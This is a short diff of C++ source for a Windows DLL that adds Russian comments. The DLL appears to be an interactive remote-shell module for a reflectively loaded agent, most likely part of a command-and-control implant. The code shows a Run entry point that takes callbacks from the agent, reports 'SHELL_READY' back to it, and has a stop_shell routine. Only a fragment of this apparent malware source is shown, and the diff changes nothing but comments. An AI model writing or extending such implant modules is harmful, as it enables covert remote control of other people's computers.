@@ -175,9 +175,10 @@ void stop_shell() {
     sh_log("SHELL: Stopped\n");
 }
 
+//точка входа модуля, вызываемая агентом после рефлективной загрузки
 extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
     if (!api) return -1;
-    
+    // сохраняет указатели на функции агента в глобальные переменные
     g_send_result = api->send_result;
     g_log = api->log;
     g_get_command = api->get_command;
@@ -193,7 +194,7 @@ extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
     if (g_send_result) g_send_result((const unsigned char*)"SHELL_READY:Interactive shell started\n", 37);
     return 0;
 }
-
+// вызывается при загрузке ивыгрузке длл
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_DETACH) {
         g_running = false;
